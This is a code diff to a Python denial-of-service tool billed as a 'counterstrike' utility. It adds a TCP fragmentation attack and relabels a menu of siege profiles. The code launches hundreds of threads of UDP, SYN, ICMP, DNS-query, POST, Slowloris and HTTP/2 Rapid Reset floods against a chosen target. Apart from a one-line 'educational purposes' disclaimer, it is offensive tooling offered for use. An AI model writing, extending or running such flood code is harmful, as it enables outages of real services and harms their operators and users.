@@ -25,27 +25,30 @@ def full_scale_counter_strike(target):
 
     # --- Parameters for a long-running, high-intensity siege ---
     params = {
-        "threads": 250,  # High thread count for classic floods
-        "slowloris_sockets": 200,  # Sockets for the 'low and slow' attack
-        "h2_threads": 50,  # Fewer threads needed for the efficient H2 attack
-        "duration": 360,  # General duration for most attacks
+        "threads": 250,
+        "slowloris_sockets": 200,
+        "h2_threads": 50,
+        "duration": 360,
     }
     print(
         f"[CONFIG] Siege mode: Using {params['threads']} flood threads, {params['slowloris_sockets']} Slowloris sockets, and {params['h2_threads']} H2 connections.")
 
-    # --- Prepare All Attack Vectors ---
-    # L3/L4 Network Floods
-    print("[+] Preparing L3/L4 vectors (UDP, SYN, ICMP)...")
+    # --- Launch Network Layer Floods (L3/L4) ---
+    print("[+] Preparing L3/L4 vectors (UDP, SYN, ICMP, TCP Frag)...")
     for port in [53, 123]:  # UDP
         args = ("UDP-Mix", target, port, params["duration"], stop_event, pause_event, params["threads"])
-        attack_threads.append(launch_attack_thread(counter_strike_helper.attack_udp, args))
+        attack_threads.append(launch_attack_thread(counter_strike_helper.attack_UDP, args))
     for port in [80, 443, 22, 3389, 25]:  # SYN
         args = (target, port, params["duration"], stop_event, pause_event, params["threads"])
         attack_threads.append(launch_attack_thread(counter_strike_helper.synflood, args))
     args = (target, params["duration"], stop_event, pause_event, params["threads"])  # ICMP
     attack_threads.append(launch_attack_thread(counter_strike_helper.icmpflood, args))
+    # NEW: TCP Fragmentation Attack on common web ports
+    for port in [80, 443]:
+        args = (target, port, params["duration"], stop_event, pause_event, params["threads"])
+        attack_threads.append(launch_attack_thread(counter_strike_helper.attack_tcp_fragmentation, args))
 
-    # L7 Application Floods
+    # --- Launch Application Layer Floods (L7) ---
     print("[+] Preparing L7 vectors (DNS Query, POST Flood, Slowloris, H2 Reset)...")
     args = (target, params["duration"], stop_event, pause_event, params["threads"])  # DNS Query
     attack_threads.append(launch_attack_thread(counter_strike_helper.attack_dns_query_flood, args))
@@ -55,8 +58,7 @@ def full_scale_counter_strike(target):
     for port in [80, 443]:  # Slowloris
         args = (target, port, params["duration"], stop_event, pause_event, params["slowloris_sockets"])
         attack_threads.append(launch_attack_thread(counter_strike_helper.attack_slowloris, args))
-    # NEW: HTTP/2 Rapid Reset
-    for port in [443, 8443]:  # Target common H2 ports
+    for port in [443, 8443]:  # H2 Reset
         args = (target, port, params["duration"], stop_event, pause_event, params["h2_threads"])
         attack_threads.append(launch_attack_thread(counter_strike_helper.attack_h2_rapid_reset, args))
 
@@ -150,7 +152,7 @@ def adaptive_strike(target):
         time.sleep(2)
 
 
-# --- Main Execution Block with Simplified Menu ---
+# --- Main Execution Block with Updated Descriptions ---
 if __name__ == "__main__":
     print("-" * 60 + "\nWELCOME TO WILLIAM'S BATTERY ---- A CONVENIENT COUNTERSTRIKE TOOL\n" + "-" * 60)
     print("This tool is for educational purposes ONLY. Use responsibly and legally.")
@@ -159,7 +161,7 @@ if __name__ == "__main__":
     try:
         options_text = """
 Select an Attack Profile:
-  1: Full Scale Counterstrike (Max-power siege with all L3-L7 vectors)
+  1: Full Scale Counterstrike (Max-power siege with all L3-L7 vectors including Fragmentation)
   2: Fast Counterstrike (Short, intense burst with modern L7 vectors)
   3: Adaptive Counterstrike (Smart, responsive attack with modern L7 vectors)
 
